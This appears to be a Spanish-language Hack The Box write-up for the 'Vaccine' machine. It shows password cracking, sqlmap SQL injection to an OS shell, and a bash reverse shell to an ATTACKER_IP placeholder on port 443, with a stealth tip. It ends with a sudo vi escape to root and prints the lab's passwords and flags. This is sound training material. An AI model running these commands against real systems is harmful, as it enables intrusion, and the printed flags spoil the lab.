---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/starting-point
dificultad: Fácil
os: Linux
relacionados:
  - "[[john]]"
  - "[[hashcat]]"
  - "[[sqlmap]]"
  - "[[md5sum]]"
  - "[[02 - Herramientas/ftp|ftp]]"
  - "[[SSH (22) - Enumeración|ssh]]"
  - "[[nvim]]"
  - "[[SQL Injection (SQLi)]]"
---
#  HackTheBox - Vaccine

## Reconocimiento

### Escaneo

Utilizo Nmap para escanear los puertos abiertos y detectar servicios en ejecución.

```bash
sudo nmap -sS -sV -sC -Pn -T4 --open -vv 10.129.95.174 -oA /nmap/vaccine
```

- `-sS`: Realiza un escaneo TCP SYN (half-open).
- `-sV`: Detecta versiones de servicios.
- `-sC`: Ejecuta scripts de Nmap por defecto.
- `-Pn`: Desactiva el ping; asume que el host está activo.
- `-T4`: Establece la velocidad del escaneo (agresiva).
- `--open`: Muestra solo puertos abiertos.
- `-vv`: Modo muy verbose.
- `-oA nmap/vaccine`: Guarda los resultados en formatos estándar.

**Resultados relevantes:**

- Puerto 21/tcp: FTP
- Puerto 22/tcp: SSH
- Puerto 80/tcp: HTTP

___

## Enumeración de Servicios

### Análisis del servicio FTP

El servicio [[03 - Conceptos/FTP]] permite conexiones anónimas. Me conecto como usuario `anonymous`.
```bash
ftp 10.129.95.174
```

Descargo el archivo `backup.zip` que encontré en el directorio FTP.
```bash
get backup.zip
```

___

## Cracking de Contraseñas

### Extracción de hash con zip2john

Para extraer el hash del archivo zip protegido, uso `zip2john`.

```bash
zip2john backup.zip > hash
```

### Cracking del hash con John the Ripper

Utilizo John the Ripper con el diccionario `rockyou.txt` para crackear el hash.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Una vez finalizado, muestro la contraseña encontrada:

```bash
john --show hash
```

**Contraseña obtenida:** `741852963`

Descomprimo el archivo `backup.zip` con la contraseña.

```bash
unzip backup.zip
```

___

## Análisis del Código Fuente

### Extracción de credenciales de `index.php`

Al revisar el archivo `index.php` extraído, encuentro credenciales en formato de texto plano y hashes MD5.

```bash
grep 'user\|pass' index.php
```

**Credenciales extraídas:**

- Usuario: `admin`
- Hash de contraseña MD5: `2cb42f8734ea607eefed3b70af13bbd3`

### Cracking del hash MD5

Guardo el hash en un archivo para crackearlo.

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > adminhash
```

#### Usando Hashcat

```bash
hashcat -m 0 -a 0 adminhash /usr/share/wordlists/rockyou.txt
```

- `-m 0`: Modo MD5.
- `-a 0`: Ataque de diccionario.

#### Usando John the Ripper

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt adminhash
```

**Contraseña obtenida:** `qwerty789`

Guardo las credenciales completas:

```bash
echo "admin:qwerty789" > credsMegacorpFinal
```

___

## Acceso Inicial

### Inicio de sesión en la aplicación web

Accedo al sitio web en `http://10.129.95.174` y utilizamos las credenciales obtenidas para iniciar sesión.

Al ingresar, encuentro un panel que permite realizar búsquedas en una base de datos.

___

## Explotación de Vulnerabilidades

### Inyección SQL con sqlmap

Detecto que el parámetro `search` en `dashboard.php` es susceptible a inyección SQL.

Ejecuto [[sqlmap]] para explotar esta vulnerabilidad y obtener una shell interactiva.

```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie='PHPSESSID=3ru9msovnqk2ekg7ndi7kvaeci' --os-shell
```

- `-u`: URL objetivo con parámetro vulnerable.
- `--cookie`: Sesión autenticada necesaria para el acceso.
- `--os-shell`: Obtiene una shell del sistema operativo.

### Obtención de una shell interactiva

La shell obtenida es limitada e inestable. Para mejorarla, procedo a obtener una reverse shell más robusta.

**Preparación del listener en nuestra máquina:**

Obtengo mi dirección IP asignada por la VPN de Hack the Box.
```bash
ifconfig tun0
```

Pongo a escuchar Netcat en el puerto 443:
```bash
nc -lvnp 443
```

>[!TIP]
>Ponerme en escucha por el puerto 443 tiene la ventaja de ser un poco más sigiloso. La reverse shell son datos del host remoto a nuestra maquina y el puerto 443 es trafico http, lo que es muy común que el trafico https salga de la red. Por lo que al usar el puerto en cuestión es menor notable. 

**Ejecución de la reverse shell en la máquina víctima:**

En la shell de sqlmap, ejecuto:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
- **`bash -c`** es para escribir comandos de bash

- **`bash -i`**:
    - `bash` es el intérprete de comandos de Unix o GNU/Linux. Se utiliza aquí para iniciar una nueva instancia interactiva de shell.
    - `-i` significa **interactivo**. Especifica que la instancia de `bash` debe ser interactiva, lo que significa que puede aceptar comandos y responder a ellos. Es decir, permite que el shell acepte entradas y devuelva salidas como en una sesión normal de consola.

- **`>& /dev/tcp/attacker_ip/port`**: Esta parte del comando es la más importante, ya que es donde se establece la **conexión de red** a la máquina atacante.
    
- **`/dev/tcp/attacker_ip/port`**: En sistemas basados en Unix/Linux, `/dev/tcp/` es una pseudo-interfaz especial que permite la comunicación sobre TCP/IP usando un archivo virtual. En realidad, no es un archivo de disco, sino una interfaz para conexiones TCP.
    - **`attacker_ip`**: Esto es un marcador de posición para la dirección IP del atacante (la máquina que está esperando recibir la conexión).
    - **`port`**: Esto es un marcador de posición para el puerto que está abierto en la máquina atacante, en el cual el atacante está escuchando conexiones. Normalmente, el atacante usará una herramienta como `netcat` o `nc` en ese puerto para esperar la conexión entrante.
    - **`>&`**: Este operador es una forma de redirigir tanto la salida estándar (`stdout`) como la salida de error estándar (`stderr`) hacia el destino especificado. Básicamente, redirige toda la salida de `bash` hacia la conexión TCP que se establecerá con el atacante.

- **`0>&1`**: Este fragmento redirige la **entrada estándar** (el descriptor de archivo `0`) al mismo lugar que la **salida estándar** (el descriptor de archivo `1`).
    
    Este comando asegura que tanto la entrada (comandos que envíe el atacante desde su máquina) como la salida (resultados de esos comandos) pasen a través de la misma conexión TCP. Esto permite al atacante interactuar con el shell en la máquina víctima de manera totalmente interactiva.

**Estabilización de la shell:**

Una vez conectado, mejoro la interacción con la shell utilizando Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- `python3`: Ejecuta el intérprete de Python 3.
- `-c`: Permite ejecutar un pequeño bloque de código Python directamente desde la línea de comandos.
- `'import pty; pty.spawn("/bin/bash")'`: Es el código Python que se ejecuta. Hace lo siguiente:
  - `import pty`: Importa el módulo `pty` (pseudo-terminal) de Python, que permite manipular terminales tipo TTY.
  - `pty.spawn("/bin/bash")`: Utiliza la función `spawn()` del módulo `pty` para ejecutar el shell `/bin/bash` en una terminal pseudo-TTY. Esto es útil, por ejemplo, cuando deseas obtener una terminal interactiva dentro de otro proceso.

___

## Escalada de Privilegios

### Contraseña usuario `postgres`

En `/var/www/html` encuentro un archivo llamado `dashboard.php` con información relevante:
```bash
cat dashboard.php | grep pass 
```
```
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```
Ahí puedo ver la contraseña del usuario en cuestión y la conexión a la base de datos. 

Considerando que la `tty` que estoy usando sigue siendo muy inestable y que inicialmente había visto abierto el servicio `ssh`, podría probar usar esos datos para lograr una conexión más estable desde `ssh`.

```bash
ssh postgres@[ip]
```
```
P@s5w0rd!
```
Funcionó, una vez adentro ya es más cómodo seguir avanzando.

### Enumeración de permisos sudo

Listo los permisos sudo del usuario actual (`postgres`):

```bash
sudo -l
```

**Resultado:**

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Esto indica que puedo ejecutar `vi` como root para editar el archivo `pg_hba.conf`.

### Explotación de `vi` para obtener root

Utilizo GTFOBins, un repositorio de técnicas de escalada de privilegios mediante binarios comunes, para explotar `vi`.

**Pasos:**

1. Ejecutamos `vi` con permisos de sudo:

    ```bash
    sudo vi /etc/postgresql/11/main/pg_hba.conf
    ```

2. Dentro de `vi`, ejecutamos los siguientes comandos:

    ```vim
    :set shell=/bin/bash
    :shell
    ```
o 
```
:!bash
```
Estos comandos dan una shell con privilegios de root.

___

## Bandera(s)

> [!FLAG] Usuario `cat /var/lib/postgresql/user.txt`
> ec9b13ca4d6229cd5cc1e09980965bf7
^bandera

> [!FLAG] Root `cat /root/root.txt`
> dd6e058e814260bc70e9bbdef2715849
^bandera